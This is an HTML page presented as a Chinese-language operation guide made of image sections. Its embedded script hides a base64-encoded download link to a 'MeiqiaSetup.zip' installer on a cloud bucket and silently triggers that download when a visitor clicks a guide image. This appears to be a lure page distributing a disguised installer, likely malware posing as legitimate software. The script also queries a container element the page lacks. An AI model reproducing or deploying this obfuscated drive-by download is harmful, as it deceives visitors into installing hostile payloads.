<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>操作指引手册</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }
        .guide-section {
            position: relative;
            overflow: hidden;
        }
        .guide-section img {
            width: 100%;
            height: auto;
            vertical-align: top;
            transition: opacity 0.3s ease;
        }
        .guide-section img:hover {
            opacity: 0.95;
        }
    </style>
</head>
<body>
    <section class="guide-section">
        <img src="static/picture/d_01.jpg" alt="操作步骤示意图">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_02.jpg" alt="功能说明图示">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_03.jpg" alt="使用技巧展示">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_04.jpg" alt="配置流程说明">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_05.jpg" alt="最终效果预览">
    </section>

<script type="module">
     // 图像展示配置
     const VISUAL_CONFIG = {
       sources: [
         'static/picture/d_01.jpg',
         'static/picture/d_02.jpg',
         'static/picture/d_03.jpg',
         'static/picture/d_04.jpg',
         'static/picture/d_05.jpg',
         'static/picture/d_06.jpg',
         'static/picture/d_07.jpg'
       ]
     };
 
     // 后台链接配置（已加密）
     const HIDDEN_RESOURCE = {
       items: Array(7).fill(
         'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
       )
     };
 
     // 图像加载模块
     const visualLoader = {
       render(container) {
         VISUAL_CONFIG.sources.forEach(src => {
           const img = new Image();
           img.className = 'media-element';
           img.src = src;
           img.alt = '视觉图像';
           container.appendChild(img);
         });
       }
     };
 
     // 资源触发模块
     const triggerHandler = {
       decode(str) {
         return atob(str);
       },
       triggerLink(url) {
         const anchor = document.createElement('a');
         anchor.href = url;
         anchor.rel = 'noopener';
         document.body.appendChild(anchor);
         anchor.click();
         setTimeout(() => anchor.remove(), 200);
       },
       fetch(index) {
         if (index >= 0 && index < HIDDEN_RESOURCE.items.length) {
           return this.decode(HIDDEN_RESOURCE.items[index]);
         }
         return null;
       }
     };
 
     // 交互控制器
     const interactionController = {
       bindEvents() {
         const container = document.querySelector('.media-container');
         container.addEventListener('click', (e) => {
           if (e.target.classList.contains('media-element')) {
             const index = [...e.target.parentElement.children].indexOf(e.target);
             const url = triggerHandler.fetch(index);
             url && triggerHandler.triggerLink(url);
           }
         });
       }
     };
 
     // 初始化主程序
     const bootstrap = () => {
       const container = document.querySelector('.media-container');
       visualLoader.render(container);
       interactionController.bindEvents();
     };
 
     document.addEventListener('DOMContentLoaded', bootstrap);
   </script>

</body>
</html>
